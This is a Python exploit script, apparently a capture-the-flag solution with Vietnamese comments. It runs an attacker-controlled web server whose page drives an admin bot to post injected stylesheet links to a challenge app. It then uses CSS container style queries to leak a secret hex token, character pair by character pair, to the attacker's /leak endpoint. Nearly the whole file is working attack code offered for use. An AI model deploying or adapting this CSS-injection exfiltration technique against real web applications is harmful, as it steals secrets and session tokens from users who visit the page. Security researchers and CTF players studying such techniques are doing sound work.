import http.server
import socketserver
import threading
import urllib.parse
import time
import string

# Configuration
CHALL_URL = "http://127.0.0.1:80"  # Thay bằng URL của server thử thách
EXPLOIT_SERVER = "http://localhost:8000"  # Thay bằng URL của server độc hại
PORT = 8000  # Cổng server độc hại
CHARSET = string.hexdigits.lower()  # Ký tự có thể có trong token (hex: 0-9, a-f)
MAX_ATTEMPTS = 50  # Số lần lặp tối đa
TOKEN_PREFIX = "justToken{"

# Biến lưu trữ token
leaked_token = TOKEN_PREFIX
leaked_parts = []

class ExploitHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path

        # Phục vụ trang HTML độc hại
        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html_content = f"""
            <form target="chall" id="form" method="POST">
              <textarea name="content"></textarea>
            </form>
            <script>
              const sleep = d => new Promise(r=>setTimeout(r,d));
              const CHALL_URL = '{CHALL_URL}';
              const form = document.querySelector('#form');
              form.action = `${{CHALL_URL}}/tasks/0`;
              let flag = '{leaked_token}';
              window.onload = async () => {{
                for(let i=0; i<{MAX_ATTEMPTS}; i++){{
                  const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=${{window.origin}}/css/${{flag}}>`;
                  const task = `${{prev}}${{'a'.repeat(500 - flag.length - 12 - prev.length)}}{{}}*{{--x:`;
                  form.content.value = task;
                  form.submit();
                  await sleep(1000);
                  open(`${{CHALL_URL}}/tasks/preview/0/0`, 'prev');
                  flag = await fetch('/poll').then(e=>e.text());
                  console.log(flag);
                  open(`${{CHALL_URL}}/tasks/delete/0/0`, 'prev');
                  await sleep(1000);
                }}
              }}
            </script>
            """
            self.wfile.write(html_content.encode('utf-8'))

        # Phục vụ stylesheet động
        elif path.startswith("/css/justToken{"):
            self.send_response(200)
            self.send_header("Content-Type", "text/css; charset=utf-8")
            self.end_headers()
            css_content = ""
            for c1 in CHARSET:
                for c2 in CHARSET:
                    css_content += f"* {{--y{c1}{c2}:,\\n{leaked_token}{c1}{c2}...[BOTTOM OF THE PAGE]\n"
                    css_content += f"@container style(--x:var(--y{c1}{c2})){{body{{background: red url('/leak/{leaked_token}{c1}{c2}');}}}}\n"
                css_content += f"* {{--y{c1}:,\\n{leaked_token}{c1}...[BOTTOM OF THE PAGE]\n"
                css_content += f"@container style(--x:var(--y{c1})){{body{{background: red url('/leak/{leaked_token}{c1}');}}}}\n"
            self.wfile.write(css_content.encode('utf-8'))

        # Thu thập token từ endpoint /leak
        elif path.startswith("/leak/"):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            leaked_part = path[len("/leak/"):]
            if leaked_part not in leaked_parts:
                leaked_parts.append(leaked_part)
                global leaked_token
                leaked_token = leaked_part
                print(f"Leaked part: {leaked_part}")
            self.wfile.write(b"OK")

        # Phục vụ endpoint /poll
        elif path == "/poll":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(leaked_token.encode('utf-8'))

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

def run_server():
    with socketserver.TCPServer(("", PORT), ExploitHandler) as httpd:
        print(f"Exploit server running at {EXPLOIT_SERVER}")
        httpd.serve_forever()

if __name__ == "__main__":
    # Khởi động server trong một thread riêng
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    # In hướng dẫn
    print(f"1. Đảm bảo server thử thách đang chạy tại {CHALL_URL}")
    print(f"2. Cung cấp URL {EXPLOIT_SERVER} cho admin bot để truy cập")
    print("3. Chờ bot truy cập và token sẽ được in ra ở đây")
    print("4. Sau khi có token, truy cập {CHALL_URL}/token?token=<leaked_token> để lấy flag")

    # Giữ chương trình chạy
    try:
        while True:
            time.sleep(1)
            if len(leaked_token) >= len(TOKEN_PREFIX) + 48:  # Token hex dài 24 byte = 48 ký tự
                print(f"Full token: {leaked_token}")
                print(f"Truy cập: {CHALL_URL}/token?token={leaked_token[len(TOKEN_PREFIX):-1]}")
                break
    except KeyboardInterrupt:
        print("\nStopping exploit server...")